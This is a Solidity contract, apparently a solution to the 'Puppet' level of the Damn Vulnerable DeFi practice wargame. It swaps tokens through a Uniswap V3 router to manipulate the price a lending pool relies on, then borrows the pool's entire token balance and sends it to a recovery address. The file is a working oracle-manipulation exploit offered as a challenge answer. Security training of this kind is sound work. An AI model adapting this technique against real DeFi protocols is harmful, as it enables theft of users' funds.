pragma solidity =0.8.25;

import {ISwapRouter} from "lib/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

interface IPuppetPool{
    function borrow(uint256 borrowAmount) external ;
}
contract PuppetAttacker{

    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    WETH weth;
    DamnValuableToken token;
    uint24 public constant poolFee = 3000; // 0.3% Fee Tier
    IPuppetPool pool;
    address recovery;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    
     
    // swap해보자
    constructor(address payable _weth, address _token, address _pool, address _recovery){
        weth = WETH(_weth);
        token = DamnValuableToken(_token);
        pool = IPuppetPool(_pool);
        recovery = _recovery;

    }

    function swapExactTokensForETH(uint256 amountIn, uint256 amountOutMin) external {
        require(token.transferFrom(msg.sender, address(this), amountIn), "Transfer failed");
        require(token.approve(address(router), amountIn), "Approval failed");

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: poolFee,
            recipient: msg.sender,
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: amountOutMin,
            sqrtPriceLimitX96: 0
        });

        router.exactInputSingle(params);
    }

    function attack() public{
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(token.balanceOf(address(pool)));
        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
        
    }

}